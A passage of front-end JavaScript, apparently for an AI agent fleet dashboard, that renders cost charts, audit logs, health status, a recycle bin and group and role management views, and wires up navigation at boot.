      const x = PAD_L + i * gap + (gap - barW) / 2;
      let yCursor = PAD_T + innerH;
      for (const k of dims) {
        const v = byDay.get(d)[k] || 0;
        if (!v) continue;
        const h = innerH * (v / max);
        yCursor -= h;
        svg += `<rect x="${x}" y="${yCursor}" width="${barW}" height="${h}" fill="${colorFor(k)}" opacity="0.85" class="cv-bar" data-day="${d}" data-dim="${groupBy}" data-value="${esc(String(k))}" style="cursor:pointer"><title>${d} · ${k}: $${v.toFixed(4)} (click for sessions)</title></rect>`;
      }
      svg += `<text x="${x + barW/2}" y="${H - PAD_B + 18}" fill="#8a8580" font-family="JetBrains Mono" font-size="10" text-anchor="middle">${d.slice(5)}</text>`;
    });
    $('cv-chart').innerHTML = svg;
    $('cv-legend').innerHTML = dims.map(k =>
      `<span><span class="sw" style="background:${colorFor(k)}"></span>${esc(k)}</span>`).join('');
    // vt-0113: click any bar → modal with sessions in that day-bucket.
    $('cv-chart').querySelectorAll('rect.cv-bar').forEach(el => {
      el.onclick = () => openBucketDrillDown(el.dataset.day, el.dataset.dim, el.dataset.value);
    });
  }

  async function openBucketDrillDown(day, dim, value) {
    const modal = $('stack-modal');                 // reuse the generic modal frame
    if (!modal) return;
    modal.hidden = false;
    modal.innerHTML = `<div class="gd-frame" style="width:640px"><div class="gd-head">
      <span class="display" style="font-size:1.1em">SESSIONS · ${esc(day)}</span>
      <span class="lbl" style="margin-left:1em">${esc(dim)} = ${esc(value)}</span>
      <span style="flex:1"></span>
      <button class="btn-ghost" data-close>× close</button>
    </div><div class="gd-body" id="bucket-body">loading…</div></div>`;
    modal.querySelector('[data-close]').onclick = () => { modal.hidden = true; };
    try {
      const r = await api('GET', `/sessions/by-bucket?day=${encodeURIComponent(day)}&dim=${encodeURIComponent(dim)}&value=${encodeURIComponent(value)}`);
      // vt-0125: server now narrows for all dims; dim_unfiltered is always
      // false. Keep the note path as a fallback for legacy servers.
      const note = r.dim_unfiltered
        ? `<p style="color:var(--text-dim); font-size:11px">Showing all sessions on this day — per-${esc(dim)} filtering not supported by this server.</p>`
        : '';
      const rows = (r.sessions || []).map(s => {
        const host = s.host_display || s.host_name || (s.host_id || '').slice(0,8);
        const ts = new Date(s.started_at).toLocaleTimeString();
        const label = s.label || '—';
        return `<tr class="row-clickable" data-sid="${esc(s.id)}">
          <td class="nowrap">${esc(ts)}</td>
          <td>${esc(host)}</td>
          <td class="nowrap">${esc(s.status)}${s.exit_code != null ? ' (' + s.exit_code + ')' : ''}</td>
          <td class="label-cell" title="${esc(label)}">${esc(label)}</td>
        </tr>`;
      }).join('');
      $('bucket-body').innerHTML = `${note}<table class="archive-table">
        <thead><tr><th>started</th><th>host</th><th>status</th><th>label</th></tr></thead>
        <tbody>${rows || '<tr><td colspan="4" style="text-align:center; color:var(--text-faint)">no sessions in this bucket</td></tr>'}</tbody>
      </table>`;
      $('bucket-body').querySelectorAll('tr[data-sid]').forEach(tr => {
        tr.onclick = () => { modal.hidden = true; navigate('/sessions/' + tr.dataset.sid); };
      });
    } catch (e) {
      $('bucket-body').textContent = 'load failed: ' + e.message;
    }
  }

  // ============ Audit log (vt-0221) ============
  function auditQueryString() {
    const t = $('audit-table')?.value || 'all';
    const op = $('audit-op')?.value?.trim() || '';
    const cid = $('audit-caller')?.value?.trim() || '';
    const u = new URLSearchParams({ table: t, limit: '500' });
    if (op) u.set('op', op);
    if (cid) u.set('caller_id', cid);
    return u.toString();
  }
  async function openAuditView() {
    const tbody = $('audit-rows');
    if (!tbody) return;
    tbody.innerHTML = '<tr><td colspan="7"><em>loading…</em></td></tr>';
    try {
      // /audit lives on rag-api root, not /fleet/* — bypass the api() helper.
      const resp = await fetch('/api/audit?' + auditQueryString(), {
        headers: { 'authorization': 'Bearer ' + state.token },
      });
      if (!resp.ok) throw new Error('HTTP ' + resp.status);
      const r = await resp.json();
      const rows = r.rows || [];
      if (!rows.length) { tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--text-faint);padding:2em">no rows</td></tr>'; return; }
      tbody.innerHTML = rows.map(r => `
        <tr class="audit-row audit-${esc(r.outcome || 'ok')}">
          <td class="ts">${esc(new Date(r.ts).toLocaleString())}</td>
          <td><span class="chip chip-source-${esc(r.source)}">${esc(r.source)}</span></td>
          <td><code>${esc(r.op)}</code></td>
          <td class="subject">${esc(r.subject || '')}</td>
          <td class="caller"><code>${esc(r.caller_id || '—')}</code></td>
          <td>${esc(r.via || '')}</td>
          <td><span class="audit-outcome audit-outcome-${esc(r.outcome || 'ok')}">${esc(r.outcome || 'ok')}</span></td>
        </tr>
      `).join('');
    } catch (e) {
      tbody.innerHTML = `<tr><td colspan="7" style="color:var(--danger)">error: ${esc(e.message)}</td></tr>`;
    }
  }
  function downloadAuditCsv() {
    const url = '/api/audit?format=csv&' + auditQueryString();
    // browser auto-downloads via content-disposition; pass Authorization
    // through a fetch then build a blob URL for the <a download>.
    fetch(url, { headers: { authorization: 'Bearer ' + state.token } })
      .then(r => r.blob())
      .then(blob => {
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = `audit-${new Date().toISOString().slice(0,10)}.csv`;
        a.click();
        URL.revokeObjectURL(a.href);
      })
      .catch(e => window.toast?.error('CSV download failed: ' + e.message));
  }

  // ============ Health dashboard (vt-0193) ============
  async function openHealthView() {
    const grid = $('health-grid');
    if (!grid) return;
    grid.innerHTML = '<div class="health-loading"><em>loading…</em></div>';
    let data;
    try {
      const r = await fetch('/api/healthz/detail', {
        headers: { authorization: 'Bearer ' + state.token },
      });
      data = await r.json();
    } catch (e) {
      grid.innerHTML = `<div class="health-card health-error"><em>fetch failed: ${esc(e.message)}</em></div>`;
      return;
    }
    grid.innerHTML = '';
    const labels = {
      pg: 'POSTGRES',
      secrets: 'SECRETS BACKEND',
      git: 'VAULT GIT',
      age_key_backup: 'AGE KEY BACKUP',
      daemons: 'FLEET DAEMONS',
    };
    for (const [key, sub] of Object.entries(data.subsystems || {})) {
      const card = document.createElement('div');
      card.className = `health-card health-${sub.status}`;
      const dot = sub.status === 'ok' ? '●' : sub.status === 'warn' ? '◐' : '✕';
      card.innerHTML = `
        <div class="health-card-head">
          <span class="health-dot">${dot}</span>
          <span class="health-name">${esc(labels[key] || key)}</span>
          <span class="health-status">${esc(sub.status)}</span>
        </div>
        <div class="health-detail">${esc(sub.detail || '')}</div>
      `;
      grid.appendChild(card);
    }
    const summary = document.createElement('div');
    summary.className = 'health-summary';
    summary.textContent = `${data.ok ? 'all systems nominal' : 'degraded'} · checked ${new Date(data.ts).toLocaleTimeString()}`;
    grid.appendChild(summary);
  }

  // vt-0255: Recycle bin page
  async function openRecycleBinView() {
    const grpBody = $('recycle-groups-rows');
    const wfBody  = $('recycle-workflows-rows');
    if (!grpBody || !wfBody) return;
    grpBody.innerHTML = `<tr><td colspan="3" style="text-align:center; padding:1em; color:var(--text-dim)">loading…</td></tr>`;
    wfBody.innerHTML  = grpBody.innerHTML;
    let data;
    try { data = await api('GET', '/recycle-bin'); }
    catch (e) {
      const err = `<tr><td colspan="3" style="text-align:center; padding:1em; color:var(--text-dim)">error: ${esc(e.message)}</td></tr>`;
      grpBody.innerHTML = err; wfBody.innerHTML = err;
      return;
    }
    const fmt = (iso) => iso ? new Date(iso).toLocaleString() : '—';
    // vt-0269: endpoints now return {rows, total, limit, offset}.
    // Older shape (array) still tolerated for graceful upgrades.
    const groups    = Array.isArray(data?.groups)    ? data.groups
                    : (data?.groups?.rows    || []);
    const workflows = Array.isArray(data?.workflows) ? data.workflows
                    : (data?.workflows?.rows || []);
    grpBody.innerHTML = groups.length === 0
      ? `<tr><td colspan="3" style="text-align:center; padding:1em; color:var(--text-faint)">empty</td></tr>`
      : groups.map(g => `<tr>
          <td>${esc(g.name)}</td>
          <td>${fmt(g.deleted_at)}</td>
          <td><button class="btn-row" data-restore-group="${esc(g.id)}">restore</button></td>
        </tr>`).join('');
    wfBody.innerHTML = workflows.length === 0
      ? `<tr><td colspan="3" style="text-align:center; padding:1em; color:var(--text-faint)">empty</td></tr>`
      : workflows.map(w => `<tr>
          <td>${esc(w.name)}</td>
          <td>${fmt(w.deleted_at)}</td>
          <td><button class="btn-row" data-restore-workflow="${esc(w.id)}">restore</button></td>
        </tr>`).join('');
    grpBody.querySelectorAll('[data-restore-group]').forEach(b => b.onclick = async () => {
      b.disabled = true;
      try { await api('POST', `/groups/${b.dataset.restoreGroup}/restore`); openRecycleBinView(); }
      catch (e) { alert(e.message); b.disabled = false; }
    });
    wfBody.querySelectorAll('[data-restore-workflow]').forEach(b => b.onclick = async () => {
      b.disabled = true;
      try { await api('POST', `/workflows/${b.dataset.restoreWorkflow}/restore`); openRecycleBinView(); }
      catch (e) { alert(e.message); b.disabled = false; }
    });
  }
  window.openRecycleBinView = openRecycleBinView;

  // vt-0367: Agent roles UI moved to agent-fleet/web/agent-roles.js
  // (window.openAgentRolesView) — same pattern as prices.js. Row-click
  // edit + count header + div-modal aligned with prices/groups.
  async function openGroupRolesPicker(group) {
    const dlg = $('group-roles-picker'); if (!dlg) return;
    $('group-roles-group-name').textContent = group.name;
    const body = $('group-roles-body');
    body.textContent = 'loading…';
    try { dlg.showModal(); } catch { return; }
    let allRoles, assigned;
    try {
      [allRoles, assigned] = await Promise.all([
        api('GET', '/agent-roles'),
        api('GET', `/groups/${group.id}/roles`),
      ]);
    } catch (e) {
      body.innerHTML = `<p style="color:var(--text-dim)">error: ${esc(e.message)}</p>`;
      return;
    }
    if (!dlg.open) return;
    const assignedById = new Map(assigned.map(r => [r.id, r]));
    // vt-0268: composition order matters. Show assigned roles first (in
    // position order, with up/down buttons), then unassigned, then a hint.
    const unassigned = allRoles.filter(r => !assignedById.has(r.id));
    body.innerHTML = (allRoles.length === 0
      ? `<p style="color:var(--text-faint)">no roles defined yet — create one in Settings → roles.</p>`
      : (assigned.length
          ? `<div class="lbl" style="margin:.3em 0">ASSIGNED (composition order, top → bottom)</div>` +
            assigned.map((r, idx) => `
              <div class="ar-role-row attached" data-pos="${idx}">
                <span class="lbl" style="min-width:1.8em;text-align:right">${idx + 1}.</span>
                <strong>${esc(r.name)}</strong>
                <span class="ar-role-desc">${esc(r.description || '')}</span>
                <button class="btn-row" data-up="${esc(r.id)}" ${idx === 0 ? 'disabled' : ''}>↑</button>
                <button class="btn-row" data-down="${esc(r.id)}" ${idx === assigned.length - 1 ? 'disabled' : ''}>↓</button>
                <button class="btn-row" data-unassign="${esc(r.id)}">remove</button>
              </div>`).join('')
          : `<div class="lbl" style="margin:.3em 0;color:var(--text-faint)">no roles assigned yet</div>`)
      + (unassigned.length
          ? `<div class="lbl" style="margin:1em 0 .3em">AVAILABLE</div>` +
            unassigned.map(r => `
              <div class="ar-role-row">
                <strong>${esc(r.name)}</strong>
                <span class="ar-role-desc">${esc(r.description || '')}</span>
                <button class="btn-row" data-assign="${esc(r.id)}">assign</button>
              </div>`).join('')
          : ''));
    // vt-0271: atomic batch reorder via PUT. The earlier impl did N
    // concurrent POSTs, which on partial failure left positions in an
    // inconsistent state with no auto-refresh — alert + manual retry
    // was the operator's only recourse. PUT does it in a single tx.
    async function reorderTo(newOrder) {
      try {
        await api('PUT', `/groups/${group.id}/roles`, { role_ids: newOrder.map(r => r.id) });
        openGroupRolesPicker(group);
      } catch (e) { alert(e.message); openGroupRolesPicker(group); }
    }
    body.querySelectorAll('[data-up]').forEach(b => b.onclick = () => {
      const idx = assigned.findIndex(r => r.id === b.dataset.up);
      if (idx <= 0) return;
      const next = assigned.slice();
      [next[idx - 1], next[idx]] = [next[idx], next[idx - 1]];
      reorderTo(next);
    });
    body.querySelectorAll('[data-down]').forEach(b => b.onclick = () => {
      const idx = assigned.findIndex(r => r.id === b.dataset.down);
      if (idx < 0 || idx >= assigned.length - 1) return;
      const next = assigned.slice();
      [next[idx], next[idx + 1]] = [next[idx + 1], next[idx]];
      reorderTo(next);
    });
    body.querySelectorAll('[data-assign]').forEach(b => b.onclick = async () => {
      b.disabled = true;
      try { await api('POST', `/groups/${group.id}/roles`, { role_id: b.dataset.assign, position: assigned.length }); openGroupRolesPicker(group); }
      catch (e) { alert(e.message); b.disabled = false; }
    });
    body.querySelectorAll('[data-unassign]').forEach(b => b.onclick = async () => {
      b.disabled = true;
      try { await api('DELETE', `/groups/${group.id}/roles/${b.dataset.unassign}`); openGroupRolesPicker(group); }
      catch (e) { alert(e.message); b.disabled = false; }
    });
    $('group-roles-close').onclick = () => dlg.close();
  }
  // vt-0367: openAgentRolesView now lives in agent-roles.js (IIFE-bound).
  window.openGroupRolesPicker = openGroupRolesPicker;

  // ============ Groups page ============
  async function openGroupsView() {
    $('groupsview-close').onclick = () => navigate('/dashboard');
    $('grp-new').onclick = async () => {
      const name = prompt('group name?');
      if (!name) return;
      const description = prompt('description (optional)') || '';
      const color = prompt('color #hex (optional)') || '';
      try {
        await api('POST', '/groups', { name, description, color });
        await loadGroups();
      } catch (e) { alert('create failed: ' + e.message); }
    };
    await loadGroups();
  }
  async function loadGroups() {
    state.groups = await api('GET', '/groups');
    $('groups-count').textContent = `${state.groups.length} groups`;
    const body = $('grp-rows');
    body.innerHTML = state.groups.length === 0
      ? '<tr><td colspan="6" style="text-align:center; padding:2em; color:var(--text-faint)">no groups yet — create one</td></tr>'
      : state.groups.map(g => {
        const hostNames = (g.host_ids || []).map(id => {
          const h = state.hosts.find(x => x.id === id);
          return h ? (h.display_name || h.name) : id.slice(0,8);
        }).join(', ') || '(none)';
        const labelsChips = (g.labels || []).length
          ? (g.labels || []).map(l => `<span class="chip">${esc(l)}</span>`).join(' ')
          : '<span style="color:var(--text-faint)">—</span>';
        return `<tr class="row-clickable" data-grp-open="${g.id}">
          <td><strong>${esc(g.name)}</strong></td>
          <td>${esc(g.description || '—')}</td>
          <td>${labelsChips}</td>
          <td title="${esc(hostNames)}">${(g.host_ids || []).length}</td>
          <td>${(() => { const sc = safeCssColor(g.color); return sc ? `<span style="background:${esc(sc)};display:inline-block;width:16px;height:16px;border:1px solid var(--line);vertical-align:middle"></span> ${esc(sc)}` : (g.color ? '(invalid)' : '—'); })()}</td>
          <td><button class="btn-row" data-grp-del="${g.id}" title="delete">✕</button></td>
        </tr>`;
      }).join('');
    body.querySelectorAll('tr[data-grp-open]').forEach(tr => {
      tr.onclick = (ev) => {
        if (ev.target.closest('[data-grp-del]')) return;
        openGroupDetail(tr.dataset.grpOpen);
      };
    });
    body.querySelectorAll('button[data-grp-del]').forEach(btn => {
      btn.onclick = async (ev) => {
        ev.stopPropagation();
        if (!confirm('delete this group? hosts stay, just the group is removed.')) return;
        await fetch('/api/fleet/groups/' + btn.dataset.grpDel, { method: 'DELETE', headers: { authorization: 'Bearer ' + state.token } });
        await loadGroups();
      };
    });
  }

  // ============ Group detail modal ============
  async function openGroupDetail(groupId) {
    const g = await api('GET', '/groups/' + groupId);
    const modal = $('group-detail-modal');
    if (!modal) {
      console.error('group-detail-modal element missing'); return;
    }
    modal.hidden = false;
    modal.innerHTML = `
      <div class="gd-frame">
        <div class="gd-head">
          <span class="display" style="font-size:1.1em">GROUP //</span>
          <input id="gd-name" class="gd-name-input" value="${esc(g.name)}" maxlength="64">
          <input id="gd-color" type="color" value="${esc(g.color || '#888888')}" title="color">
          <span style="flex:1"></span>
          <button class="btn-ghost" data-gd-close>× close</button>
        </div>
        <div class="gd-body">
          <section>
            <label class="lbl">DESCRIPTION</label>
            <input id="gd-desc" value="${esc(g.description || '')}" style="width:100%; box-sizing:border-box; padding:.3em .5em; background:var(--bg); color:var(--text); border:1px solid var(--line); font-family:var(--font-mono);">
          </section>
          <section style="margin-top:1.4em">
            <label class="lbl">LABELS (inherited by all member hosts)</label>
            <div id="gd-labels-chip-row"></div>
            <form id="gd-add-label-form" style="margin-top:.4em">
              <input id="gd-new-label" type="text" placeholder="new label…" style="width:200px"/>
              <button type="submit" class="btn-ghost">+ add</button>
            </form>
          </section>
          <section style="margin-top:1.4em">
            <label class="lbl">HOSTS (${(g.hosts || []).length})</label>
            <div id="gd-hosts-rows"></div>
            <form id="gd-add-host-form" style="margin-top:.4em">
              <select id="gd-host-pick">${state.hosts.filter(h => !(g.hosts||[]).find(gh => gh.id === h.id)).map(h => `<option value="${h.id}">${esc(h.display_name || h.name)}</option>`).join('')}</select>
              <button type="submit" class="btn-ghost">+ add host</button>
            </form>
          </section>
          <section style="margin-top:1.4em">
            <label class="lbl">BRAIN PROMPT — prepended to every spawn dispatched to this group</label>
            <textarea id="gd-brain-prompt" rows="6" spellcheck="false"
              style="width:100%; box-sizing:border-box; padding:.4em .6em; background:var(--bg); color:var(--text); border:1px solid var(--line); font-family:var(--font-mono); font-size:12px; resize:vertical">${esc(g.brain_prompt || '')}</textarea>
            <div style="display:flex; gap:8px; align-items:center; margin-top:.4em">
              <button id="gd-save-brain" class="btn-primary" style="width:auto; padding:.3em 1em">save brain</button>
              <span id="gd-brain-status" class="lbl"></span>
            </div>
          </section>
          <section style="margin-top:1.4em">
            <label class="lbl">AGENT ROLES — additional prompts prepended after the brain</label>
            <div id="gd-roles-chips" style="margin:.4em 0"></div>
            <button id="gd-manage-roles" class="btn-ghost" style="width:auto; padding:.3em 1em">⚙ manage roles</button>
          </section>
        </div>
      </div>
    `;
    // Editable name/color/desc handlers
    $('gd-name').onblur = async () => {
      const v = $('gd-name').value.trim();
      if (!v || v === g.name) return;
      if (state.groups.some(other => other.name === v && other.id !== g.id)) {
        alert('name already exists');
        $('gd-name').value = g.name;
        return;
      }
      try {
        const updated = await patchGroupWithVersion(g, { name: v });
        if (!updated) return;
        g.name = v;
        loadGroups();
      } catch (e) {
        alert(e.message);
        $('gd-name').value = g.name;
      }
    };
    $('gd-color').onchange = async () => {
      try {
        const updated = await patchGroupWithVersion(g, { color: $('gd-color').value });
        if (!updated) return;
        g.color = $('gd-color').value;
        loadGroups();
      } catch (e) { alert(e.message); }
    };
    $('gd-desc').onblur = async () => {
      const v = $('gd-desc').value.trim();
      if (v === (g.description || '')) return;
      try {
        const updated = await patchGroupWithVersion(g, { description: v || null });
        if (!updated) return;
        g.description = v;
        loadGroups();
      } catch (e) { alert(e.message); }
    };
    // vt-0151: group brain prompt — explicit save (large textarea, not onblur)
    const saveBrain = $('gd-save-brain');
    if (saveBrain) saveBrain.onclick = async () => {
      const v = $('gd-brain-prompt').value;
      const status = $('gd-brain-status');
      status.textContent = 'saving…';
      try {
        const updated = await patchGroupWithVersion(g, { brain_prompt: v || null });
        if (!updated) { status.textContent = ''; return; }
        g.brain_prompt = v || null;
        status.textContent = v ? 'saved · injected into group dispatches' : 'saved · cleared';
      } catch (e) { status.textContent = 'error: ' + e.message; }
    };
    // vt-0259: role chips + manage button
    async function renderRoleChips() {
      const row = $('gd-roles-chips');
      if (!row) return;
      try {
        const roles = await api('GET', `/groups/${g.id}/roles`);
        row.innerHTML = roles.length
          ? roles.map(r => `<span class="chip">${esc(r.name)}</span>`).join(' ')
          : '<span style="color:var(--text-faint)">no roles assigned</span>';
      } catch (e) {
        row.innerHTML = `<span style="color:var(--text-dim)">error: ${esc(e.message)}</span>`;
      }
    }
    renderRoleChips();
    const manageRolesBtn = $('gd-manage-roles');
    if (manageRolesBtn) manageRolesBtn.onclick = async () => {
      await window.openGroupRolesPicker?.(g);
      // Re-render chips when picker closes — small delay since dlg.close is sync
      const dlg = $('group-roles-picker');
      if (dlg) dlg.addEventListener('close', renderRoleChips, { once: true });
    };
    function renderLabels() {
      const row = $('gd-labels-chip-row');
      row.innerHTML = (g.labels || []).length
        ? (g.labels || []).map((l, i) =>
            `<span class="chip">${esc(l)} <button class="chip-x" data-rm-label="${i}">×</button></span>`).join(' ')
        : '<span style="color:var(--text-faint)">no labels yet</span>';
      row.querySelectorAll('[data-rm-label]').forEach(btn => {
        btn.onclick = async () => {
          const idx = parseInt(btn.dataset.rmLabel, 10);
          const newLabels = (g.labels || []).filter((_, i) => i !== idx);
          try {
            const updated = await patchGroupWithVersion(g, { labels: newLabels });
            if (!updated) return;
            g.labels = newLabels;
            renderLabels();
            loadGroups();
          } catch (e) { alert('remove label failed: ' + e.message); }
        };
      });
    }
    function renderHosts() {
      const row = $('gd-hosts-rows');
      row.innerHTML = (g.hosts || []).length
        ? (g.hosts || []).map(h =>
            `<div class="gd-host-row">
              <span>${esc(h.display_name || h.name)}</span>
              <span style="flex:1"></span>
              <button class="btn-ghost" data-rm-host="${h.id}" style="font-size:.75em">remove</button>
            </div>`).join('')
        : '<span style="color:var(--text-faint)">no hosts in this group</span>';
      row.querySelectorAll('[data-rm-host]').forEach(btn => {
        btn.onclick = async () => {
          // vt-0081: use api() helper (throws on !ok) instead of raw fetch.
          // Commit local state AFTER server confirms. Surface error to user.
          try {
            await api('DELETE', `/groups/${g.id}/hosts/${btn.dataset.rmHost}`);
            g.hosts = (g.hosts || []).filter(h => h.id !== btn.dataset.rmHost);
            renderHosts();
            $('gd-host-pick').innerHTML = state.hosts
              .filter(h => !(g.hosts||[]).find(gh => gh.id === h.id))
              .map(h => `<option value="${h.id}">${esc(h.display_name || h.name)}</option>`).join('');
            loadGroups();
          } catch (e) {
            alert('remove host failed: ' + e.message);
          }
        };
      });
    }
    renderLabels();
    renderHosts();
    $('gd-add-label-form').onsubmit = async (ev) => {
      ev.preventDefault();
      const inp = $('gd-new-label');
      const v = (inp.value || '').trim();
      if (!v) return;
      const newLabels = [...(g.labels || []), v];
      try {
        const updated = await patchGroupWithVersion(g, { labels: newLabels });
        if (!updated) return;
        g.labels = newLabels;
        inp.value = '';
        renderLabels();
        loadGroups();
      } catch (e) { alert('add label failed: ' + e.message); }
    };
    $('gd-add-host-form').onsubmit = async (ev) => {
      ev.preventDefault();
      const hostId = $('gd-host-pick').value;
      if (!hostId) return;
      try {
        await api('POST', `/groups/${g.id}/hosts`, { host_id: hostId });
        const added = state.hosts.find(h => h.id === hostId);
        if (added) g.hosts = [...(g.hosts || []), added];
        renderHosts();
        $('gd-host-pick').innerHTML = state.hosts
          .filter(h => !(g.hosts||[]).find(gh => gh.id === h.id))
          .map(h => `<option value="${h.id}">${esc(h.display_name || h.name)}</option>`).join('');
        loadGroups();
      } catch (e) { alert('add host failed: ' + e.message); }
    };
    modal.querySelector('[data-gd-close]').onclick = () => { modal.hidden = true; };
  }

  // ============ Boot ============
  async function boot() {
    readToken();
    // Load i18n dictionary BEFORE first render to avoid raw-key flash (auth page too)
    if (window.fleetI18n) {
      await window.fleetI18n.loadLang(localStorage.fleetLang || 'en');
      window.fleetI18n.wireSwitcher();
    }
    if (!state.token) { showAuth(); return; }
    showApp();
    wireSpawn();
    // Now that state.token is populated, do the real first feature load.
    try { window.__fleetLoadFeatures?.(); } catch {}
    $('reload').onclick = () => {
      const btn = $('reload');
      btn.classList.remove('spin');
      void btn.offsetWidth;
      btn.classList.add('spin');
      refresh();
    };
    // Defensive: any missing nav-* in a stale cached HTML would throw on
    // `null.onclick =` and abort boot() mid-wire, leaving every later
    // button (vault, roles, audit, ...) unbound with no console error.
    const wireNav = (id, hash) => { const el = $(id); if (el) el.onclick = () => navigate(hash); };
    wireNav('nav-dashboard', '/dashboard');
    wireNav('nav-archive',   '/archive');
    wireNav('nav-cost',      '/cost');
    wireNav('nav-groups',    '/groups');
    wireNav('nav-workflows', '/workflows');
    wireNav('nav-prices',    '/prices');
    wireNav('nav-vault',     '/vault');
    const vBack = $('vaultview-close'); if (vBack) vBack.onclick = () => navigate('/dashboard');
    // vt-0193: health dashboard nav
    const hNav = $('nav-health'); if (hNav) hNav.onclick = () => navigate('/health');
    const hBack = $('healthview-close'); if (hBack) hBack.onclick = () => navigate('/dashboard');
    const hReload = $('health-reload'); if (hReload) hReload.onclick = () => openHealthView();
    // vt-0221: audit
    const aNav = $('nav-audit'); if (aNav) aNav.onclick = () => navigate('/audit');
    const aBack = $('auditview-close'); if (aBack) aBack.onclick = () => navigate('/dashboard');
    const aReload = $('audit-reload'); if (aReload) aReload.onclick = () => openAuditView();
    const aExport = $('audit-export'); if (aExport) aExport.onclick = () => downloadAuditCsv();
    ['audit-table','audit-op','audit-caller'].forEach(id => {
      const el = $(id); if (el) el.onchange = () => openAuditView();
      if (el) el.onkeydown = (e) => { if (e.key === 'Enter') openAuditView(); };
    });
    const wfNew = $('wf-new'); if (wfNew) wfNew.onclick = () => navigate('/workflows/new');
    const wfTpl = $('wf-from-template'); if (wfTpl) wfTpl.onclick = () => window.openWorkflowTemplatePicker?.();
    const grpTrash = $('grp-trash'); if (grpTrash) grpTrash.onclick = () => navigate('/recycle-bin');
    const wfTrash  = $('wf-trash');  if (wfTrash)  wfTrash.onclick  = () => navigate('/recycle-bin');
    const rcReload = $('recycle-reload'); if (rcReload) rcReload.onclick = () => window.openRecycleBinView?.();
    const rcBack = $('recyclebinview-close'); if (rcBack) rcBack.onclick = () => navigate('/groups');
    const arNav = $('nav-agent-roles'); if (arNav) arNav.onclick = () => navigate('/agent-roles');
    // vt-0367: ar-new / agentrolesview-close are now wired by
    // agent-roles.js when the view opens (same pattern as prices.js).
    // Old window.openAgentRoleEdit shim is gone — the module owns the modal.
    const wfBack = $('workflowsview-close'); if (wfBack) wfBack.onclick = () => navigate('/dashboard');
    const wfvBack = $('workflowrunviewer-close'); if (wfvBack) wfvBack.onclick = () => navigate('/workflows');
    setOverlay(true, 'STANDBY', 'select a session');
    // vt-0392 (Phase 1C): mount chat-view + wire tab toggle.
    const chatViewEl = $('chat-view');
    if (chatViewEl && window.chatView) {
      try { window.chatView.mount(chatViewEl); } catch (e) { console.warn('chatView.mount', e); }
    }
    document.querySelectorAll('.viewer-tabs .tab-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.viewer-tabs .tab-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        const t = btn.dataset.tab;
        const chat = $('chat-view');
        const raw = $('static-transcript');
        if (chat) chat.hidden = (t !== 'chat');
        if (raw) raw.hidden = (t !== 'raw');
        // vt-0392 v2: raw tab = static post-hoc transcript. Lazy fetch on
        // first reveal per session; reload button re-fetches.
        if (t === 'raw' && state.selected) {
          refreshStaticTranscript(state.selected);
          requestAnimationFrame(fitStaticTerm);
        }
      });
    });
    const reloadBtn = $('static-transcript-reload');
    if (reloadBtn) reloadBtn.addEventListener('click', () => {
      if (state.selected) refreshStaticTranscript(state.selected, { force: true });
    });
    startPolling();
    applyRoute();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else { boot(); }
})();
